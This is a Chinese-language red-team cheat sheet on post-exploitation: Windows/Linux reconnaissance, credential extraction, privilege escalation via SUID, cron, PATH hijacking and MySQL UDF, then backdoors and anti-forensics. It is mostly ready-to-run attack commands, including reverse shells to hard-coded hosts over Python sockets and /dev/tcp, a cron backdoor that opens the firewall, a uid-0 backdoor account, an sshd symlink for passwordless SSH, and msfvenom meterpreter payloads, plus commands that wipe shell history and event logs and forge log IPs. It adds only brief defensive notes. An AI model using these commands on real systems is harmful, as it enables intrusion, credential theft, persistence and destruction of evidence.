# 红蓝对抗

## 内网信息收集

### 主机信息

- 网络配置信息
    - `ipconfig /all`
- 用户列表信息
    - `net user` ：查看本机用户列表
    - `net localgroup administrator` ：查看本机管理组用户
    - `query user` ：查看当前在线用户
- 进程列表信息
    - `tasklist /v`
    - `wmic process list brief`
- 查询系统及安装软件信息
    - `systeminfo`
- 查看安装软件及其版本、路径等
    - cmd环境：`wmic product get name,version`
    - PowerShell环境：`Get-WmiObject -class Win32_Product | Select-Object -Property name, version`
- 查询本机开放的端口信息
    - `netstat -ano` ，如果指定端口号再加上 `| findstr 端口号`
- 本机共享信息
    - `net share` ：显示主机上所有共享资源信息
    - `wmic share get name,path,status` ：查询共享资源名称、路径和状态
- 查询当前权限
    - `whoami /all` ：显示当前用户名信息、属于的组及安全标识符(SID)和当前用户访问令牌的特权

### 服务信息

WIN+R打开运行窗口，在打开窗口输入”services.msc”即可打开Windows服务列表，或者在cmd环境下： `wmic service list brief | findstr Running` 

### 敏感信息

主机中的敏感文件通常有应用配置文件、历史记录操作文件、浏览器访问记录、系统日志等。

- 应用配置文件
    - 存储Windows系统初次安装的密码：`C:\windows\repair\sam`
    - IIS配置文件： `C:\Windows\System32\inetsrv\MetaBase.xml`
    - MySQL配置：`C:\Program Files\mysql\my.ini`
    - MySQL root： `C:\Program Files\mysql\data\mysql\user.MYD`
    - PHP配置信息： `C:\Windows\php.ini`
- 历史记录操作文件(没找到)
    
    PowerShell v5版本以上的操作历史记录会直接保存在指定文件中。
    
    `Get-Content (Get-PSReadLineOption).HistorySavePath` 
    
- 浏览器访问记录
    - Chrome浏览器
        
        `C:\Users $username\AppData\Local\Google\Chrome\User Data\Default\History`
        
    - Firefox浏览器
        
        `C:\Users $username\AppData\name.default\places.sqlite`
        
    - IE浏览器
        
        `C:\Users\Administrator\AppData\Local\Microsoft\Windows\History`
        
- 系统日志
    - 应用日志：`C:\Windows\System32\winevt\Logs\Application.evtx`
    - 系统日志：`C:\Windows\System32\winevt\Logs\System.evtx`
    - 安全日志：`C:\Windows\System32\winevt\Logs\Security.evtx`

### 密码提取

- 浏览器密码提取
    
    工具：WebBrowserPassView（System权限）
    
- WLAN密码提取（Stystem权限）
    - 查看之前连接过得所有Wi-Fi名称：`netsh wlan show profiles`
    - 提取保存的密码：`netsh wlan show profiles wifi名称 key=clear`
- 系统密码提取
    - Windows工具：Mimikatz，提取明文密码、HASH值、PIN码、Kerberos票据。
    - hash破解工具：ophcrack
    - Kali Linux密码破解工具：John the Ripper

## 权限提升

### Linux系统提取

- **内核漏洞提权**
    - `uname -a`查看Linux系统内核版本
    - SearchSploit工具搜索相应内核的可用提权脚本并上传到提权主机
    - `gcc -o exploit xxxx.c` 编译提权脚本
    - 运行编译的可执行文件exploit
- **SUID提权**
    - 使用find命令查找正在系统运行的所有具有SUID的可执行文件
        
        `find / -perm -u=s -type f 2>dev/null` 
        
    - 在具有SUID属性的可执行文件中选择“find”命令进行提权
        
        `find . -exec /bin/sh -p \; -quit` 
        
        这个命令中，**`/bin/sh -p`**开启一个shell，并保持原始权限（由于SUID，可能是root权限）。
        
- **计划任务提权**
    - 查看计划任务文件的内容 `cat /etc/crontab`
        
        注：低权限用户并不能直接通过`crontab -l -u roo`t来查看Root用户的计划任务
        
    - 根据计划任务内容选取要执行的文件，查看其权限
    - 选取属主是root且可写的文件，实现反弹shell的功能
        
        ```python
        # 反弹shell功能代码
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect('192.168.75.27', 4444)
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p = subprocess.call(['/bin/bash', '-i'])
        ```
        
        在本地监听端口4444接收反弹shell
        
- **环境变量劫持提权**
    - 前提条件
        - 文件具备SUID权限
        - 文件的所有人和所属组是root
    - 使用C语言程序，使用`system`函数调用系统`cat`命令进行提权
    - 进入`/tmp`目录创建一个“cat”文件，文件内容是“/bin/sh”
    - 使用`sudo`命令编译源文件生成可执行文件，并赋予SUID权限（4777）
    - 满足提权条件后，添加“/tmp”目录到环境变量后运行可执行程序即可
- **Docker容器提权**
    
    

### Windows系统权限提升

- **本地漏洞提权**
    
    利用Windows系统本身存在的一些系统内核溢出漏洞，但未曾打相应的补丁，测试人员可以通过对比查询出的补丁信息来查找缺失的补丁号，通过缺失补丁号查找对照相应的系统版本漏洞的EXP。
    
- **应用劫持提权**
    
    如Notepad++的动态链接库劫持漏洞。
    

### 数据库权限提升

渗透过程爆破获取了MySQL服务Root用户的弱口令密码，此时就可以利用MySQL服务进行用户自定义函数(UDF)反弹shell提权

- **MySQL提权**
    - 登录MySQL，查看版本，指定数据库，并检查数据库的插件路径，用于后续的文件写入
    - 在Kali Linux系统中使用SearchSploit工具搜索MySQL数据库的UDF提权脚本
        
        查看脚本内容，代码注释中有使用方法
        
    - 将提权脚本上传到目标主机的`/tmp`目录下
    - 编译提权脚本得到动态链接库文件 (so)
    - 登录数据库，按照源码内注释的内容使用，先创建表，再读取动态链接库的内容插入表中
    - 查询表的内容，并将动态链接库文件写出到数据库的插件路径中
    - 使用写出的文件创建函数
    - 使用创建的函数读取敏感文件
- **Oracle提权**
    
    利用Java存储过程
    
- **SQL Server提权**
    
    SQL Sever数据库自身可以执行操作系统命令的存储过程xp_cmdshell，从而可能被攻击者利用实现权限的提升。
    
    - xp_cmdshell
    - sp_oacreate

## 权限维持

### Linux系统后门

- **Bash远控后门**
    - 在目标主机上编写后门文件
    - `chmod  +x` 为后门脚本增加执行权限
    - 利用“Crond”计划任务服务定时执行后门文件
    
    ```bash
    #!/bin/bash
    
    if netstat -ano | grep -v grep | grep "172.20.10.6">/dev/null
    then
    echo "OK">/dev/null
    else
    /sbin/iptables --policy INPUT ACCEPT
    /sbin/iptables --policy OUTPUT ACCEPT
    
    bash -i >& /dev/tcp/172.20.10.6/1234 0>&1
    
    fi
    ```
    
    该脚本首先查询是否有远程回连的Shell， 如果没有就关闭目标主机的防火墙规则，允许一切输入输出流量，并送目标主机反弹Shell到远程主机。
    
- **添加用户后门**
    
    可以添加一个拥有“root”权限的用户(uid=0)作为后门使用:
    
    `useradd -o -u 0 backdoor`
    
    PS: 防御措施
    
    - 多查看系统账户的相关情况
    - 注意那些使用较少的账户是不是被更改过
- **SUID Shell后门**
    
    利用拥有”root”权限的脚本，让普通用户可以使用“root”权限。
    
    - 拷贝`/bin/bash`文件为”backdoor”
    - 使用`chmod 4755`给予相应的权限
    - 使用普通用户运行`./backdoor`后门文件，此时普通用户可以拥有root权限
    
    PS： 防御措施
    
    - 重要目录上增加文件指纹校验防护功能
    - 使用`find` 查找有没有危险的具有”root”权限的“suid”程序
    - 查找SUID设置的文件
- **软连接后门**
    
    使用软连接将PAM认证文件更改，通过软件连接的文件名再/etc/pam.d/目录下寻找对应的PAM配置文件，只要软连接文件内容中包括`auth sufficient pam_rootok.so` ， 即可实现SSH任意密码登录。
    
    ```bash
    ┌──(root㉿kali)-[~/Desktop]
    └**─# which sshd**
    /usr/sbin/sshd
    
    ┌──(root㉿kali)-[~/Desktop]
    └─**# ln -s /usr/sbin/sshd /tmp/su**
    
    ──(root㉿kali)-[~/Desktop]
    **└─# /tmp/su -oport=12345**
    
    ┌──(root㉿kali)-[~/Desktop]
    **└─# netstat -antlp**                                                                                                                          
    Active Internet connections (servers and established)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
    tcp        0      0 127.0.0.1:44193         0.0.0.0:*               LISTEN      1114/containerd     
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      268888/sshd: /usr/s 
    tcp        0      0 0.0.0.0:12345           0.0.0.0:*               LISTEN      257245/su: /tmp/su  
    tcp6       0      0 :::22                   :::*                    LISTEN      268888/sshd: /usr/s 
    tcp6       0      0 :::12345                :::*                    LISTEN      257245/su: /tmp/su 
    ```
    
    在上面的操作中，SSH的认证文件被修改为etc/pam.d/su。
    
    PS: 防范措施
    
    - 查看是否有可疑的端口、进程
    - 检查pam_unix.so的修改时间
- **Inetd后门**

### Windows系统后门

- **Guest账户后门**
    
    ```bash
    **# 查看Guest账户**
    C:\Users\Administrator>**net user guest
    # 开启Guest账户**
    C:\Users\Administrator>**net user guest /active:yes
    # 给账户增加密码**
    C:\Users\Administrator>**net user guest ABC123456
    # 权限提升：将Guest加入管理员组**
    C:\Users\Administrator>**net localgroup administrators guest /add**
    ```
    
- **影子账户后门**
- **启动项类后门**
    
    在Windows系统通常可以在绝对路径`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` 下放置程序或者脚本文件，在该目录下的程序会在Windows系统重启后第一时间运行。但文件存放于启动目录下会被安全防护软件拦截，此时可以添加注册表启动项，从而达到绕过全防护软件拦截的目的。
    
    `计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
    
    在该目录下右键新建—>新建字符串。
    
- **计划任务后门**
    
    ```bash
    # 在目标主机上建立一个每天凌晨时运行的计划任务EvilJob
    schtasks /create /sc DAILY /st 00:01 /tn EvilJob /tr c:\start.bat
    # 查看计划任务
    schtasks /query /tn EvilJob
    # 立即执行计划任务
    schtasks /run /tn EvilJob
    # 删除计划任务
    schtasks /delete /tn EvilJob
    ```
    
- **网络远控后门**
    
    使用msf生成”.exe”后门。
    
    ```bash
    # 生成exe后门
    ──(root㉿kali)-[~/Desktop]
    └─# **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.217.128 LPORT=8080 -f exe -e x64/xor_dynamic -i 15 -o /root/msf.exe**
    # 在msf里使用侦听模块开启侦听
    ┌──(root㉿kali)-[~]
    └─**# msfconsole**       
    msf6 > **use /exploit/multi/handler**
    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set lhost 192.168.217.128 
    msf6 exploit(multi/handler) > set lport 8080
    msf6 exploit(multi/handler) > show options
    msf6 exploit(multi/handler) > exploit
    ```
    
    此类后门有一些特征信息可在一些系统监视器上被发现，极易被管理员清除，此时可以通过进程迁移的方式，注入其他同权限或低权限的进程中：`migrate 目标pid`
    
    PS： 防范措施
    
    - 查看注册表启动项
    - 查看服务启动
    - 查看可疑网络连接
    - 查看系统重要目录中的隐藏文件
    - 查”svchost.exe”宿主程序中的服务
    - 查数字签名

### 命令痕迹清理

- **Shell历史命令文件**
    - root： `/root/.bash_history`
    - 非root: `/home/用户名/.bash_history`
- 清除命令历史记录
    
    `cat  /dev/null > /root/.bash_history`
    
    如果Shell版本为Bash时，使用`history -c`命令来清理当前连接终端时操作过的命令。
    
    如果不是bash，则上述命令无法清理历史记录。这时需要在执行命令前添加空格，那么命令不会被记录到命令历史记录文件中。
    
    修改root用户的Shell配置信息，将配置信息中的历史命令记录条数修改为0：
    
    `sed -i 's/HISTSIZE=1000/HISTSIZE=0/' /root/.bashrc`
    
    `source .bashrc` 
    

### 系统日志清理

- **Linux日志清理**
    - 查看系统中正在运行的服务： `systemctl | grep running`
    - 日志文件位置： `/var/log`
    - 清空日志文件内容： `cat /dev/null > /var/log/auth.log`
    - 替换IP： `sed -i 's/10.1.1.4/8.8.8.8/g' /var/log/auth.log`
- **windows日志清理**
    - 日志文件位置： `C:\Windows\System32\winevt\Logs`
    - 日志文件类型
        - Application.evtx 应用日志
        - System.evtx 系统日志
        - Security.evtx 安全日志
    - 全局日志清理
        
        ```bash
        PowerShell -Command "& {Clear-Eventlog -Log Application,System,Security}"
        PowerShell -Command "& {Get-WinEvent -ListLog Application,System,Security -Force | % {Wevtutil.exe cl $_.Logname}}"
        ```
        
        或者使用Metasploit工具清理：
        
        ```bash
        # 查看事件日志
        meterpreter > run event_manager -i
        # 删除事件日志
        meterpreter > run event_manager -c
        # 或者
        meterpreter > clearev
        
        ```
        
    - 局部日志清理
        - 在cmd环境下使用`wevtutil.exe`清理单条或者多条日志
        - 在PowerShell环境下使用以下命令查看日志服务进程ID：
            
            ```bash
            Get-WmiObject -Class win32_service -Filter "name = 'eventlog'"
            Get-CimInstance -ClassName win32_service -Filter "name = 'eventlog'"
            ```
            
            得到日志服务PID后，通过`taskkill` 命令停止服务，退出使用前，使用`net start eventlog` 命令重启日志服务即可和。
            
    
    ### 隐藏文件创建
    
    - **Linux系统文件隐藏**
        
        ```bash
        # 创建隐藏目录
        ┌──(root㉿kali)-[~/Desktop]
        └─**# mkdir .backdoor**
        ──(root㉿kali)-[~/Desktop]
        └─**# cd .backdoor/**
        # 创建隐藏文件
        ┌──(root㉿kali)-[~/Desktop/.backdoor]
        └**─# vim .hello.sh**   
        # 修改隐藏文件的修改时间
        ┌──(root㉿kali)-[~/Desktop/.backdoor]
        └─**# touch -d "Sep 25 14:00" .hello.sh** 
        ```
        
    - **Windows系统文件隐藏**
        
        使用自带命令行工具`Attrib` 用来显示或更改文件属性，达到隐藏文件的目的。
        
        ```bash
        # 隐藏msf.exe文件
        attrib +h msf.exe
        # 更改文件的时间属性（未成功）
        (ls "C:\Users\TEST.txt") | foreach-object{$_.LastWriteTime=Get-Date; $_.CreationTime=Get-Date; $_.LastAccessTime=Get-Date}
        ```